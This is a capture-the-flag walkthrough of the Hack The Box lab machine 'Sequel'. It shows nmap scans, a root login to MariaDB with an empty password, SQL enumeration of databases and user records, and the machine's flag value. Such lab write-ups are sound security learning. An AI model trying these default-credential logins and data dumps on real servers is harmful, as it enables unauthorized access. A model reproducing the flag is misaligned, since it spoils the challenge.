# Sequel

TARGET MACHINE IP ADDRESS
10.129.95.232

---
## Nmap

```
nmap -Pn 10.129.95.232
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-21 14:41 EST
Nmap scan report for 10.129.95.232
Host is up (0.047s latency).
Not shown: 999 closed tcp ports (reset)
PORT     STATE SERVICE
3306/tcp open  mysql

Nmap done: 1 IP address (1 host up) scanned in 0.87 seconds
```

```
nmap -Pn -sS -sV -sC -O -T4 -p 3306 10.129.95.232
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-21 14:42 EST
Nmap scan report for 10.129.95.232
Host is up (0.047s latency).

PORT     STATE SERVICE VERSION
3306/tcp open  mysql?
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
|   Thread ID: 65
|   Capabilities flags: 63486
|   Some Capabilities: IgnoreSigpipes, SupportsTransactions, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolNew, Support41Auth, ConnectWithDatabase, SupportsCompression, Speaks41ProtocolOld, LongColumnFlag, DontAllowDatabaseTableColumn, InteractiveClient, FoundRows, ODBCClient, SupportsLoadDataLocal, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: }Q\Z1"Tct>w_Th0Q)v:[
|_  Auth Plugin Name: mysql_native_password
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 244.04 seconds
```

## Attempt Login

```
mysql -h 10.129.95.232 -u root -p
Enter password: [empty ENTER]
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 73
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> 
```

## MySQL Statements Used

```
show databases;                     # prints out the dbs we can access
use htb                             # select db to use
show tables;                        # tables inside the current db
select * from config;               # prints all data from db table
select * from config where id=5;    # prints out one record from db table
```
## Show Databases

```
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (1.551 sec)
```

Default Tables Common to MySQL: 
1. information_schema
2. mysql
3. performance_schema

## Use a DB

```
MariaDB [(none)]> use htb
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
```

## Show DB Tables

```
MariaDB [htb]> show tables;
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
2 rows in set (4.942 sec)
```

## Show Table Content: 

```
MariaDB [htb]> select * from config;
+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+----------------------------------+
7 rows in set (0.048 sec)
```

```
MariaDB [htb]> select * from users;
+----+----------+------------------+
| id | username | email            |
+----+----------+------------------+
|  1 | admin    | admin@sequel.htb |
|  2 | lara     | lara@sequel.htb  |
|  3 | sam      | sam@sequel.htb   |
|  4 | mary     | mary@sequel.htb  |
+----+----------+------------------+
4 rows in set (0.048 sec)
```

## Select the Flag

```
MariaDB [htb]> select * from config where id=5;
+----+------+----------------------------------+
| id | name | value                            |
+----+------+----------------------------------+
|  5 | flag | 7b4bec00d1a39e3dd4e021ec3d915da8 |
+----+------+----------------------------------+
1 row in set (0.612 sec)
```

![Pasted image 20240221141017](https://github.com/GregKedrovsky/Hacking/assets/26492233/26a901b2-ec6b-41c1-96f0-d776aa12913a)

